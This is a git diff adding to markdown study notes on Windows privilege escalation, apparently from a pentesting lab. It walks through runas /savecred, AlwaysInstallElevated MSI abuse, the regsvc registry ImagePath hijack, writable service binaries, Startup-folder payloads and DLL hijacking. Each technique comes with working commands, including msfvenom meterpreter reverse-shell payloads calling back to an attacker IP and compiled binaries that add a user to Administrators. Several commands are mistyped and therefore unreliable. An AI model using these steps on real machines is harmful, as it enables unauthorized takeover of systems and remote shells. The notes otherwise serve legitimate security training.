@@ -120,9 +120,121 @@
 
 ### Escalation path: runas
 
-* `cmdkey /list`
+* `cmdkey /list` shows currently stored credential keys
+* use runas.exe tool which is built in to Windows
+* run cmd.exe as Administrator leads to root shell:
+* ***(similar when running sudo on Linux but here we don't have to have the credentials)***
 * `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe \c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt`
 
+### Escalation path: registry
 
+* start PowerShell: `powershell -ey bypass`
+* then start PowerUp.ps1: `. .\PowerUp.ps1`
+* in PowerUp: `Invoke-AllChecks`
+* Check for autologon for credentials. Look for FILE ALL ACCES FOR EVERYONE
 
+#### Check for autoruns
 
+* `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`
+
+#### Using metasploit
+
+* `use multi/handler`
+* `set payload windows/meterpreter/reverse_tcp`
+* `set lhost <your IP>
+* set up payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp lhost=<your IP> -f exe -o program.exe`
+
+#### Using PowerUp
+
+* `Write-suserAddMSI` it's going to set up a file wich we can use to add admin user to the existing ones.
+* `net localground administrators`
+
+#### there are packages for Windows, called MSI packages are Windows installers. We have the registry feature where they install packages elevated. They will install as an admin user. This is a configuration issue we can take advantage of this. If the value is set to 1 in the registry we can attack it!
+
+##### Detection:
+
+* open command prompt and: `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
+* if you find from output that ***AlwaysInstallElevated*** value is set to 1 then
+* `eg query HKCU\Software\Policies\Microsoft\Windows\Installer`
+
+##### Exploit:
+
+* start metasploit, then `use multi/handler` and `set payload windows/meterpreter/reverse_tcp` and `set lhost <your IP` finally: `run`
+* generate payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp lhost=<your IP> -f msi -o setup.msi
+* place generated setup.msi from kali onto the target machine's /temp folder
+* run it and enjoy your shell :)
+
+##### Another method using registry
+
+* start with `powershell -ep bypass`
+* from Windows machine copy `C:\Users\User\Desktop\Tools\Source\windows_service.c` to the Kali VM.
+* Open ***windows_service.c*** in a text editor and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators user /add`
+* Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_service.c -o x.exe` (NOTE: if this is not installed, use `sudo apt install gcc-mingw-w64`) 
+* Copy the generated file x.exe, to the Windows VM.
+* On the Windows VM copy the generated file.exe to `C:\Temp`
+* Open a command prompt and type in `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
+* In the command prompt type: `sc start regsvc`
+*  It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: ` net localgroup administrators`
+
+### Escalation path: executable files
+
+##### PowerUp
+
+* run ***PowerUp.ps1*** with SHIFT+right click and open up in command prompt
+* `powershell -ep bypass` and `Invoke-AllChecks`
+* in commands prompt: `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe`
+* `sc start filepermservice.exe`
+* confirm that the user was added to admin group: `net localgroup administrators`
+
+##### Accesschk
+
+##### Detection:
+
+* `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+* who has permission set to: **FILE_ALL_ACCESS** on filepermservice.exe file
+
+##### Exploitation:
+
+* `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
+* `sc start filepermsvc`
+* confirm that user was added to admin group: `net localgroup administrators`
+
+### Escalation path: startup application
+
+##### Detection:
+
+* Open command prompt and type: `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
+* From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
+
+##### Exploitation:
+
+* in metasploit: `use multi/handler` then `set payload windows/meterpreter/reverse_tcp` set lhost to your IP and `run`
+* with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp lhost=<your IP> -f exe -o x.exe`
+* place ***x.exe*** on the Windows machine here: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
+* when admin logs in you got a shell
+
+### Escalation path: dll hijacking
+
+*  ***.dll*** stands for dynamic library. Shared libraries, variables etc. We often see .dll running with executables, we are looking for a specific instance. At startup Windows is looking for a specific .dll if it doesn't exist we can create one running code in it for our own purposes.
+
+##### Detection:
+
+* Find the ***Process Monitor Filter*** on the Windows machine
+* set filter: RESULT, IS, NAME NOT FOUND ***the last one you have to type it in to the search bar***, then INCLUDE and hit ***add***
+* PATH is coming up in search results that end with .dll, back to filtering, select PATH, ends with, type in ***.dll***, include and hit ***apply***
+* if we can control the service we can overwright the .dll files
+* command prompt: `sc start dll svc`
+* result shows ***name not found*** those are the good ones
+
+##### Exploitation:
+
+* several options: we can generate a .dll file with a reverse shell in it and just overwrite the original one while listening on nc
+* in this case copy selected .dll file to kali
+* open it up in gedit
+* replace line: `system(....)` with `system("cmd.exe /k net localgroup administrators user /add ");` ***user being the user we want to create***
+* compile it: `x86_64-mingw32-gcc windows_dll.c -shared -o <copied_filename_from_win_machine>.dll
+* copy generated file over to the Windows machine's ***/temp*** folder.
+* command prompt: `sc stop dllsvc & sc start dllsvc`
+* checking results: `net localgroup administrators`
+
+### Escalation path: Service Permissions
